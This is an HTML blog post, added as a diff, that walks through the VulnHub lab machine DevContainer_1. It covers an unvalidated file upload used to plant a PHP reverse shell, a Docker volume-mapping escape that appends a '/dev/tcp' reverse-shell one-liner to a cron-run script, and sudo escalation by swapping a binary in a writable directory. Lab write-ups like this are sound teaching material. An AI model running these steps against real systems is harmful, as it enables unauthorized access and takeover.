@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+
+  <title>DevContainer_1 Writeup</title>
+
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>DevContainer_1 Writeup | 5ubterranean’s Blog</title>
+<meta name="generator" content="Jekyll v3.9.0" />
+<meta property="og:title" content="DevContainer_1 Writeup" />
+<meta name="author" content="5ubterranean" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Introduction" />
+<meta property="og:description" content="Introduction" />
+<link rel="canonical" href="http://localhost:8000/DevContainer_1" />
+<meta property="og:url" content="http://localhost:8000/DevContainer_1" />
+<meta property="og:site_name" content="5ubterranean’s Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-09-24T00:00:00-05:00" />
+<script type="application/ld+json">
+{"datePublished":"2020-09-24T00:00:00-05:00","@type":"BlogPosting","description":"Introduction","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:8000/DevContainer_1"},"url":"http://localhost:8000/DevContainer_1","author":{"@type":"Person","name":"5ubterranean"},"headline":"DevContainer_1 Writeup","dateModified":"2020-09-24T00:00:00-05:00","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    
+    <h1>5ubterranean@home:~$</h1>
+    </a>
+    <div class="header-links">
+      <a href="/archive"><h2 class="header-link">Archive</h2></a>
+<a href="/tags.html"><h2 class="header-link">Tags</h2></a>
+<a href="/about"><h2 class="header-link">About</h2></a>
+<a href="/atom.xml"><h2 class="header-link">RSS</h2></a>
+    </div>
+  </div>
+</header>
+    <div class="container">
+      <section id="main_content">
+        <article>
+  <h2>DevContainer_1 Writeup</h2>
+  <time datetime="2020-09-24T00:00:00-05:00" class="by-line">24 Sep 2020</time>
+  <h1 id="introduction"><a href="#header-1"></a>Introduction</h1>
+
+<p>DevContainer_1 is an easy machine created by <a href="https://twitter.com/0x04E1">@0x04E1</a>, on this machine we will find a page with a upload function where we will upload a PHP reverse shell, then we we will find us on a Docker container rather than the machine itself, after checking the files we will find a file that is being run every x seconds, we will add a reverse shell to it in order to get a shell on the machine, finaly we will see that we can execute a file without supplying a password, we will see that we have permissions over the directory where that file is located, so we can move it and create a reverse shell on the path of the original file and get root.</p>
+
+<h1 id="enumeration"><a href="#header-1"></a>Enumeration</h1>
+
+<p>We start use nmap find the open ports and then make a deeper scan on those ports.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -p- -Pn -n -T 4 192.168.56.129
+nmap -sC -sV -p 80, -Pn -o scan.txt 192.168.56.129
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Freelancer - Start Bootstrap Theme
+</code></pre></div></div>
+
+<p>There is only port 80 open, so we check the website.</p>
+
+<p><img src="assets/images/devcontainer_1/Website.png" alt="" /></p>
+
+<p>Using gobuster we find some directories. <code class="language-plaintext highlighter-rouge">gobuster dir -u http://192.168.56.129/ -w /usr/share/wordlist/dirb/common.txt -t 50 -x txt,html,php -o busterc.txt</code></p>
+
+<p><img src="assets/images/devcontainer_1/gobuster.png" alt="" /></p>
+
+<h1 id="gaining-access"><a href="#header-1"></a>Gaining Access</h1>
+
+<p>The most interesting directory is “upload” so we enter to it.</p>
+
+<p><img src="assets/images/devcontainer_1/upload.png" alt="" /></p>
+
+<p>There says that there is a couple of allowed files, but they might not be validated so we try to upload <a href="https://github.com/pentestmonkey/php-reverse-shell">pentestmonkey’s php reverse shell</a>. It gets upload with no problem.</p>
+
+<p><img src="assets/images/devcontainer_1/uploaded.png" alt="" /></p>
+
+<p>We configured the file to connect to us on port 54231, so we start a listener with <code class="language-plaintext highlighter-rouge">nc -lvp 54321</code> and when we open the file we get a shell.</p>
+
+<p><img src="assets/images/devcontainer_1/shell1.png" alt="" /></p>
+
+<h1 id="escaping-from-docker"><a href="#header-1"></a>Escaping from Docker</h1>
+
+<p>After enumating for a while we find that we are not inside the machine itself, but in a Docker container, if we go to check the source code of the website we find a directory named “Maintenan-Web-Docker”.</p>
+
+<p><img src="assets/images/devcontainer_1/websource.png" alt="" /></p>
+
+<p>Inside of it we find 3 files, “maintenance.sh”, “list.sh” and “out.txt”. The code of maintenance.sh is:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+<span class="c">#Version 1.0</span>
+<span class="c">#This script monitors the uploaded files. It is a reverse shell monitoring measure.</span>
+<span class="c">#path= /home/richard/web/webapp/upload/files/</span>
+/home/richard/web/Maintenance-Web-Docker/list.sh
+</code></pre></div></div>
+
+<p>And list.sh:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+<span class="nb">date</span> <span class="o">&gt;&gt;</span> /home/richard/web/Maintenance-Web-Docker/out.txt
+<span class="nb">ls</span> /home/richard/web/upload/files/ | <span class="nb">wc</span> <span class="nt">-l</span> <span class="o">&gt;&gt;</span> /home/richard/web/Maintenance-Web-Docker/out.txt
+</code></pre></div></div>
+
+<p>We see that maintenance.sh calls list.sh, and list.sh writes some info in out.txt, but we see something interesting, the path of the files are “/home/richard/web/Maintenance-Web-Docker/”, but we are in “/var/www/html/Maintenance-Web-Docker/”, so the machine must be doing volume mapping, we can guess that the container was started with <code class="language-plaintext highlighter-rouge">docker run -p 80:80 -v /home/richard/web/Maintenance-Web-Docker/:/var/www/html/Maintenance-Web-Docker/ &lt;image name&gt;</code>. That means that if we write in “/var/www/html/Maintenance-Web-Docker/” we will be writing inside the machine, the next important thing is “out.txt”, if we check it, we see that it has some lines written, and they were written with today’s date.</p>
+
+<p><img src="assets/images/devcontainer_1/outfile.png" alt="" /></p>
+
+<p>Probably there is a crontab running that executes maintenance.sh or list.sh every x time, so we move out.txt and after some time it gets created again so we know that those are being run.</p>
+
+<p><img src="assets/images/devcontainer_1/outagain.png" alt="" /></p>
+
+<p>Everything we have to do is add a reverse shell to list.sh, I like to use <a href="https://github.com/D4Vinci/One-Lin3r">one-lin3r</a> to generate reverse shell one liners.</p>
+
+<p><img src="assets/images/devcontainer_1/onelin3r.png" alt="" /></p>
+
+<p>So we execute <code class="language-plaintext highlighter-rouge">echo ‘bash -i &gt;&amp; /dev/tcp/192.168.56.130/54322 0&gt;&amp;1’ &gt;&gt; list.sh</code> to append our reverse shell to list.sh, we check that is has been edited.</p>
+
+<p><img src="assets/images/devcontainer_1/newlist.png" alt="" /></p>
+
+<p>As before we had a listener waiting with: <code class="language-plaintext highlighter-rouge">nc -lvp 54322</code>, and after some seconds we will have our shell.</p>
+
+<p><img src="assets/images/devcontainer_1/shell2.png" alt="" /></p>
+
+<p>We can read user.txt.</p>
+
+<p><img src="assets/images/devcontainer_1/usertxt.png" alt="" /></p>
+
+<h1 id="privilege-escalation"><a href="#header-1"></a>Privilege Escalation</h1>
+
+<p>We check if we can execute any command with sudo using <code class="language-plaintext highlighter-rouge">sudo -l</code>, and we get that we can execute <code class="language-plaintext highlighter-rouge">sudo /home/richard/HackTools/socat TCP-LISTEN:8080,fork TCP:127.0.0.1:90</code> without supplying a password.</p>
+
+<p><img src="assets/images/devcontainer_1/sudotest.png" alt="" /></p>
+
+<p>As the path of the command indicates the file is inside our home directory.</p>
+
+<p><img src="assets/images/devcontainer_1/homefiles.png" alt="" /></p>
+
+<p>Since it is inside our home directory we can rename the directory with <code class="language-plaintext highlighter-rouge">mv HackTools btools</code>, now we create the directory “HackTools” again, and we create the file socat inside of it with a revese shell, finally we execute <code class="language-plaintext highlighter-rouge">sudo /home/richard/HackTools/socat TCP-LISTEN:8080,fork TCP:127.0.0.1:90</code> and we will get our root shell and retrieve “proof.txt”.</p>
+
+<p><img src="assets/images/devcontainer_1/proof.png" alt="" /></p>
+
+
+  <h3>Tags</h3>
+  
+  <a href="/tags.html#docker"> Docker</a> &nbsp;
+  
+  <a href="/tags.html#vulnhub"> Vulnhub</a> &nbsp;
+  
+</article>
+      </section>
+    </div>
+  </div>
+
+   <footer>
+  <a href="https://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
+    <span>
+        <b>5ubterranean</b>
+    </span>
+    
+    <span>© 2020</span>
+  </a>
+</footer>
+
+  
+</body>
+
+</html>
